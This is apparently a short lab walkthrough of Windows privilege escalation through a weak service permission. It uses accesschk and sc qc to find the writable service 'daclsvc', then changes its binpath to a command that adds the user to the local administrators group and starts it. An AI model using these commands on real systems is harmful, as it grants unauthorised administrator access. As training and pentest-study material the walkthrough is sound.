if we see the command given we can see have a binary `daclsvc` that we have read write permissions
-vwc = verbose,writable,service 
everyone = everyone on the computer
`C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *`

If we see the output of powerUp.ps1 we can see that 


![[escalation-via-binary paths-2.png]]

we see our binary and we have the permission to restart the service 
and 
if we do 
`C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc`
![[escalation-via-binary paths-3.png]]

as we can see RW Everyone this means our user/group (non privilefed) has the permission to read write 
RW BUILTIN\Admin means that admin group also has the permissions to change 

if we query the service 
`sc qc daclsvc`
![[escalation-via-binary paths-4.png]]
we can see the complete path of that service 

**Exploitation**

from the 3rd screenshot we can see that we have the permissions to change the configuration files lets change that get malicious with that 

using the command 
`sc config daclsvc binpath= "net localgroup administrators user /add"`

then if just start the service using `sc start daclsvc` we can just abuse and add our user to administrators
